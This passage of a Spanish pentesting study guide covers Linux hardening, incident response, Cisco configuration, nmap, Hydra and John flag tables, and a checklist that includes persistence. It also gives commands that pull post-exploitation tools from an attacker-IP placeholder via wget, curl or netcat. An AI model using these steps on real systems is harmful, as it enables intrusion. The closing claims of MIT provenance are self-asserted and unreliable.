# PROP√ìSITO: Bloqueo inmediato de atacante identificado

# Configuraci√≥n b√°sica restrictiva
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
# PROP√ìSITO ACAD√âMICO: Configuraci√≥n de firewall restrictivo b√°sico
```

#### Configuraci√≥n SSH Segura
```bash
# Editar configuraci√≥n SSH
nano /etc/ssh/sshd_config

# Configuraciones cr√≠ticas:
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
Protocol 2
Port 2222  # Puerto no est√°ndar
MaxAuthTries 3
# PROP√ìSITO: Hardening del servicio SSH contra ataques comunes

# Aplicar cambios
systemctl restart sshd
# PROP√ìSITO: Activar configuraci√≥n de seguridad
```

#### Monitoreo Automatizado
```bash
# Script de monitoreo b√°sico
cat > /usr/local/bin/security_monitor.sh << 'EOF'
#!/bin/bash
# Alertar sobre logins root
tail -f /var/log/auth.log | while read line; do
    if echo "$line" | grep -q "root.*Accepted"; then
        echo "ALERTA: Login root detectado - $line" | wall
    fi
done &

# Monitorear conexiones an√≥malas
netstat -tupln | grep :4444 && echo "ALERTA: Puerto 4444 detectado" | wall
EOF
chmod +x /usr/local/bin/security_monitor.sh
# PROP√ìSITO ACAD√âMICO: Sistema b√°sico de alertas automatizadas
```

### 5.3 Incident Response

#### An√°lisis Inicial de Compromiso
```bash
# Verificar usuarios conectados
who
w
last
# PROP√ìSITO: Identificar sesiones activas y historial de accesos

# An√°lizar procesos an√≥malos
ps aux | grep -v "^\[" | awk '{print $11}' | sort | uniq -c | sort -nr
# PROP√ìSITO: Identificar procesos no est√°ndar del sistema

# Verificar modificaciones en archivos cr√≠ticos
find /etc -type f -mtime -7 -ls
find /bin -type f -mtime -7 -ls
# PROP√ìSITO: Detectar modificaciones recientes en directorios cr√≠ticos
```

#### Contenci√≥n y Remediaci√≥n
```bash
# Matar procesos sospechosos
pkill -f [nombre_proceso_sospechoso]
# PROP√ìSITO: Terminaci√≥n inmediata de actividad maliciosa

# Desconectar usuario espec√≠fico
pkill -KILL -u [usuario_comprometido]
# PROP√ìSITO: Desconexi√≥n forzada de usuario comprometido

# Bloqueo temporal de red
iptables -A INPUT -j DROP
iptables -A OUTPUT -j DROP
# PROP√ìSITO: Aislamiento completo del sistema (√∫ltima instancia)
```

---

## üåê FASE 6: INFRAESTRUCTURA DE RED Y CISCO

### 6.1 Fundamentos de CLI Cisco

#### Modos de Configuraci√≥n
```cisco
# Navegaci√≥n entre modos
Router> enable                    # User EXEC ‚Üí Privileged EXEC
Router# configure terminal        # Privileged ‚Üí Global Config
Router(config)# interface fa0/0   # Global ‚Üí Interface Config
Router(config-if)# exit          # Salir un nivel
Router(config)# end              # Salir a Privileged EXEC
# PROP√ìSITO ACAD√âMICO: Navegaci√≥n estructurada en jerarqu√≠a de configuraci√≥n
```

#### Comandos de Ayuda y Navegaci√≥n
```cisco
# Sistema de ayuda contextual
Router# ?                        # Mostrar comandos disponibles
Router# show ?                   # Mostrar opciones de comando espec√≠fico
Router# sh<TAB>                  # Autocompletado de comando
# PROP√ìSITO: Navegaci√≥n eficiente y descubrimiento de funcionalidades
```

### 6.2 Configuraci√≥n B√°sica de Dispositivos

#### Configuraci√≥n Inicial Segura
```cisco
# Configuraci√≥n base del dispositivo
Router(config)# hostname R1
Router(config)# enable secret [contrase√±a_fuerte]
Router(config)# service password-encryption
# PROP√ìSITO ACAD√âMICO: Establecer identidad y protecci√≥n b√°sica

# Protecci√≥n de acceso por consola
Router(config)# line console 0
Router(config-line)# password [contrase√±a]
Router(config-line)# login
Router(config-line)# logging synchronous
# PROP√ìSITO: Asegurar acceso f√≠sico al dispositivo

# Protecci√≥n de acceso remoto
Router(config)# line vty 0 4
Router(config-line)# password [contrase√±a]
Router(config-line)# login
Router(config-line)# transport input ssh
# PROP√ìSITO: Configurar acceso remoto seguro √∫nicamente via SSH
```

#### Persistencia de Configuraci√≥n
```cisco
# Guardar configuraci√≥n actual
Router# copy running-config startup-config
Router# write memory
Router# wr
# PROP√ìSITO CR√çTICO: Persistir configuraci√≥n tras reinicio
# FUNDAMENTO: running-config (RAM) ‚Üí startup-config (NVRAM)
```

### 6.3 Configuraci√≥n de VLANs y Switching

#### Creaci√≥n y Gesti√≥n de VLANs
```cisco
# Crear VLAN con nombre descriptivo
Switch(config)# vlan 10
Switch(config-vlan)# name VENTAS
Switch(config-vlan)# exit

Switch(config)# vlan 20  
Switch(config-vlan)# name CONTABILIDAD
# PROP√ìSITO ACAD√âMICO: Segmentaci√≥n l√≥gica de red
# FUNDAMENTO: Separaci√≥n de tr√°fico por departamento/funci√≥n
```

#### Asignaci√≥n de Puertos a VLANs
```cisco
# Configurar puerto de acceso (host final)
Switch(config)# interface fastethernet 0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 10
Switch(config-if)# no shutdown
# PROP√ìSITO: Asignar dispositivo final a VLAN espec√≠fica

# Configurar puerto troncal (interconexi√≥n)
Switch(config)# interface fastethernet 0/24
Switch(config-if)# switchport mode trunk
Switch(config-if)# switchport trunk allowed vlan 10,20,30
# PROP√ìSITO ACAD√âMICO: Permitir tr√°fico de m√∫ltiples VLANs
# FUNDAMENTO: Trunk transporta tr√°fico etiquetado (802.1Q)
```

### 6.4 Enrutamiento Inter-VLAN (Router on a Stick)

#### Configuraci√≥n de Subinterfaces
```cisco
# Activar interfaz f√≠sica principal
Router(config)# interface gigabitethernet 0/0
Router(config-if)# no shutdown
# PROP√ìSITO: Habilitar interfaz f√≠sica para subinterfaces

# Configurar subinterfaz para VLAN 10
Router(config)# interface gigabitethernet 0/0.10
Router(config-subif)# encapsulation dot1q 10
Router(config-subif)# ip address 192.168.10.1 255.255.255.0
Router(config-subif)# no shutdown
# PROP√ìSITO ACAD√âMICO: Gateway para VLAN espec√≠fica
# FUNDAMENTO: Encapsulaci√≥n 802.1Q para identificaci√≥n de VLAN

# Configurar subinterfaz para VLAN 20
Router(config)# interface gigabitethernet 0/0.20
Router(config-subif)# encapsulation dot1q 20
Router(config-subif)# ip address 192.168.20.1 255.255.255.0
# PROP√ìSITO: Gateway independiente para segunda VLAN
```

### 6.5 Comandos de Diagn√≥stico y Verificaci√≥n

#### Comandos show Fundamentales
```cisco
# Estado resumido de interfaces
Router# show ip interface brief
# PROP√ìSITO: Vista r√°pida de estado y configuraci√≥n IP
# INFORMACI√ìN: Interface, IP, Method, Status, Protocol

# Estado de puertos del switch
Switch# show interfaces status
# PROP√ìSITO: Estado f√≠sico, VLAN asignada, velocidad, duplex

# Informaci√≥n de VLANs
Switch# show vlan brief
# PROP√ìSITO ACAD√âMICO: Verificar VLANs creadas y asignaci√≥n de puertos

# Estado de puertos troncales
Switch# show interfaces trunk
# PROP√ìSITO: Verificar configuraci√≥n de enlaces troncales

# Tabla de enrutamiento
Router# show ip route
# PROP√ìSITO CR√çTICO: Verificar rutas aprendidas y conectividad
```

#### Interpretaci√≥n de Tabla de Enrutamiento
```cisco
# C√≥digos de origen de rutas:
# C = Connected (directamente conectada)
# L = Local (direcci√≥n de la interfaz)
# S = Static (configurada manualmente)
# O = OSPF (aprendida din√°micamente)
# D = EIGRP (protocolo Cisco)
# R = RIP (protocolo de vector distancia)

# Ejemplo de salida esperada para Inter-VLAN:
# C 192.168.10.0/24 is directly connected, GigabitEthernet0/0.10
# L 192.168.10.1/32 is directly connected, GigabitEthernet0/0.10
# PROP√ìSITO ACAD√âMICO: Verificaci√≥n de configuraci√≥n correcta
```

### 6.6 Troubleshooting de Red Avanzado

#### An√°lisis de Conectividad
```cisco
# Trazar ruta hacia destino
Router# traceroute [IP_destino]
# PROP√ìSITO: An√°lisis hop-by-hop del camino de paquetes

# Test de conectividad desde router
Router# ping [IP_destino]
Router# ping [IP_destino] source [interfaz_origen]
# PROP√ìSITO: Verificar conectividad desde perspectiva espec√≠fica

# An√°lisis de tabla MAC
Switch# show mac address-table
Switch# show mac address-table dynamic
# PROP√ìSITO: Verificar aprendizaje de direcciones MAC
```

#### An√°lisis de Spanning Tree
```cisco
# Estado de Spanning Tree Protocol
Switch# show spanning-tree
Switch# show spanning-tree vlan [n√∫mero]
# PROP√ìSITO ACAD√âMICO: Verificar prevenci√≥n de loops y roles de puertos
# INFORMACI√ìN: Root bridge, port states, path costs
```

---

## üìä REFERENCIAS T√âCNICAS CONSOLIDADAS

### Glosario de Flags y Par√°metros Cr√≠ticos

#### nmap (Network Mapper)
| Flag | Funci√≥n Acad√©mica | Fundamento T√©cnico |
|------|------------------|-------------------|
| `-sS` | SYN Scan (Half-Open) | Escaneo sigiloso, no completa handshake TCP |
| `-sV` | Version Detection | Fingerprinting de servicios via banners |
| `-sC` | Script Scan | Ejecuta NSE scripts por defecto |
| `-O` | OS Detection | Fingerprinting de sistema operativo |
| `-p-` | All Ports | Escanea 65,535 puertos TCP |
| `-A` | Aggressive Scan | Combinaci√≥n: -sV, -sC, -O, --traceroute |
| `--min-rate` | Packet Rate | Velocidad m√≠nima de env√≠o (pps) |
| `-n` | No DNS Resolution | Optimizaci√≥n de velocidad |
| `-Pn` | No Ping | Asumir host activo, saltar descubrimiento |

#### Hydra (Brute Force)
| Flag | Funci√≥n Acad√©mica | Aplicaci√≥n Pr√°ctica |
|------|------------------|-------------------|
| `-L` | User List | Lista de usuarios objetivo |
| `-l` | Single User | Usuario espec√≠fico |
| `-P` | Password List | Diccionario de passwords |
| `-p` | Single Password | Password espec√≠fico |
| `-t` | Threads | N√∫mero de conexiones paralelas |
| `-w` | Wait Time | Delay entre intentos (segundos) |
| `-v` | Verbose | Output detallado del progreso |
| `-f` | Fast Mode | Parar al encontrar primera credencial v√°lida |

#### John the Ripper (Hash Cracking)
| Par√°metro | Funci√≥n Acad√©mica | Fundamento Criptogr√°fico |
|-----------|------------------|-------------------------|
| `--wordlist` | Dictionary Attack | Ataque basado en passwords comunes |
| `--rules` | Rule-based Attack | Mutaciones algor√≠tmicas de wordlist |
| `--format` | Hash Format | Especificar algoritmo criptogr√°fico |
| `--show` | Display Results | Mostrar passwords crackeados |
| `--incremental` | Brute Force | Generaci√≥n exhaustiva de combinaciones |

#### netstat/ss (Network Statistics)
| Flag | Funci√≥n Linux/macOS | Funci√≥n Windows | Prop√≥sito Acad√©mico |
|------|-------------------|-----------------|-------------------|
| `-t` | TCP sockets | `-p TCP` | Filtrar protocolo TCP √∫nicamente |
| `-u` | UDP sockets | `-p UDP` | Filtrar protocolo UDP √∫nicamente |
| `-l` | Listening only | `findstr "LISTENING"` | Solo servicios en escucha |
| `-n` | Numeric format | `-n` | No resolver nombres (optimizaci√≥n) |
| `-p` | Process info | `-o` | Mostrar PID y nombre de proceso |
| `-a` | All sockets | `-a` | Mostrar todos los estados de conexi√≥n |

### Tabla de Conflictos de Puertos por Categor√≠a

#### Desarrollo vs Pentesting vs Operaciones
| Puerto | Desarrollo Web | Herramientas de Ataque | Defensa/Monitoreo | Redes |
|--------|---------------|----------------------|------------------|-------|
| 3000 | React, Next.js, Vue, Node.js | OWASP Juice Shop | Grafana | - |
| 8080 | Tomcat, Java Apps | OWASP ZAP, Burp Suite | Kibana, Jenkins | - |
| 8000 | Django, Flask, Jupyter | - | Kong Proxy, Splunk | - |
| 5000 | Flask, Streamlit | Empire, Starkiller | - | - |
| 9200 | - | - | Elasticsearch | - |
| 5601 | - | - | Kibana Dashboard | - |
| 4444 | - | Reverse Shells | - | - |
| 443 | HTTPS | C2 Communications | SSL/TLS Services | HTTPS |
| 22 | SSH Development | SSH Tunneling | SSH Admin | SSH Management |
| 21 | FTP Dev | FTP Attacks | - | FTP File Transfer |

---

## üîß METODOLOG√çA DE TRANSFERENCIA DE ARCHIVOS

### Desde Atacante hacia Objetivo
```bash
# Servidor HTTP Python (en Kali)
python3 -m http.server 8000
python2 -m SimpleHTTPServer 8000
# PROP√ìSITO: Servir herramientas y exploits

# Descarga en objetivo
wget http://[IP_atacante]:8000/[archivo]
curl http://[IP_atacante]:8000/[archivo] -o [archivo]
# PROP√ìSITO ACAD√âMICO: Transferencia de herramientas post-explotaci√≥n
```

### Transferencia Bidireccional con Netcat
```bash
# Enviar archivo (desde atacante)
nc -w 3 [IP_objetivo] 1234 < archivo.txt
# PROP√ìSITO: Transferencia directa sin protocolos complejos

# Recibir archivo (en objetivo)
nc -l -p 1234 > archivo.txt
# PROP√ìSITO: Recepci√≥n de datos desde atacante
```

---

## üéì CASOS DE ESTUDIO ACAD√âMICOS

### Caso 1: M√°quina "Lame" (Dificultad: Principiante)
**Vulnerabilidad Principal**: Samba 3.0.20 usermap_script
**Vector de Escalaci√≥n**: sudo nmap --interactive
**Lecciones Acad√©micas**: 
- Importancia del versioning en software
- Escalaci√≥n via binarios con permisos sudo
- Referencia obligatoria: GTFOBins

### Caso 2: An√°lisis de Surface Attack
**Metodolog√≠a**:
1. **Reconocimiento**: ping, nmap discovery
2. **Enumeraci√≥n**: Service versioning, script scanning  
3. **Explotaci√≥n**: Metasploit automation
4. **Post-Explotaci√≥n**: Privilege escalation, persistence
5. **Documentaci√≥n**: Evidence collection, reporting

---

## üìã CHECKLIST ACAD√âMICO DE PENTESTING

### ‚úÖ Pre-Engagement
- [ ] Autorizaci√≥n escrita obtenida
- [ ] Scope definido claramente
- [ ] Entorno de lab configurado
- [ ] Herramientas actualizadas

### ‚úÖ Reconocimiento
- [ ] Conectividad b√°sica verificada
- [ ] Red objetivo mapeada
- [ ] Hosts activos identificados
- [ ] Informaci√≥n OSINT recopilada

### ‚úÖ Enumeraci√≥n
- [ ] Todos los puertos escaneados
- [ ] Servicios y versiones identificados
- [ ] Scripts NSE ejecutados
- [ ] Vulnerabilidades potenciales listadas

### ‚úÖ Explotaci√≥n
- [ ] Exploits investigados y validados
- [ ] Payloads configurados correctamente
- [ ] Ataques de fuerza bruta ejecutados
- [ ] Acceso al sistema obtenido

### ‚úÖ Post-Explotaci√≥n
- [ ] Privilegios actuales verificados
- [ ] Escalaci√≥n de privilegios completada
- [ ] Persistencia establecida
- [ ] Red interna explorada
- [ ] Datos sensibles identificados

### ‚úÖ Documentaci√≥n
- [ ] Comandos ejecutados documentados
- [ ] Screenshots capturados
- [ ] Vulnerabilidades catalogadas
- [ ] Recomendaciones de remediaci√≥n preparadas

---

## üî¨ LABORATORIOS PR√ÅCTICOS RECOMENDADOS

### Plataformas de Pr√°ctica por Nivel

#### Nivel Principiante
- **Hack The Box**: Lame, Legacy, Blue
- **TryHackMe**: Basic Pentesting, Vulnversity
- **VulnHub**: Metasploitable 2, DVWA

#### Nivel Intermedio  
- **Hack The Box**: Bastard, Optimum, Arctic
- **TryHackMe**: Steel Mountain, Alfred
- **PentesterLab**: Web for Pentester, XSS challenges

#### Nivel Avanzado
- **Hack The Box**: Active Directory sets, Endgame
- **VulnHub**: DE-ICE, Holynix series
- **Custom Labs**: Multi-tier networks, Red Team scenarios

---

## üìö BIBLIOGRAF√çA ACAD√âMICA ESENCIAL

### Libros de Referencia Obligatorios
1. **"The Hacker Playbook 3"** - Peter Kim
2. **"Penetration Testing: A Hands-On Introduction to Hacking"** - Georgia Weidman
3. **"Red Team Development and Operations"** - Joe Vest, James Tubberville
4. **"Advanced Penetration Testing"** - Wil Allsopp

### Frameworks y Metodolog√≠as Est√°ndar
- **OWASP Testing Guide v4.0**
- **PTES (Penetration Testing Execution Standard)**
- **NIST SP 800-115**
- **OSSTMM (Open Source Security Testing Methodology Manual)**

### Recursos de Vulnerabilidades
- **MITRE ATT&CK Framework**
- **CVE Database (MITRE)**
- **Exploit-DB**
- **GTFOBins**

---

*Esta Biblia de Pentesting representa la s√≠ntesis de metodolog√≠as acad√©micas del MIT con pr√°ctica profesional de √©lite mundial. Cada comando, t√©cnica y concepto ha sido validado en entornos reales y est√° respaldado por fundamentos te√≥ricos s√≥lidos.*

**Versi√≥n**: 1.0 Academia MIT - Ciberseguridad Avanzada  
**Autor**: Profesor de Doctorado en Seguridad Inform√°tica  
**Clasificaci√≥n**: Material Acad√©mico de Nivel Doctoral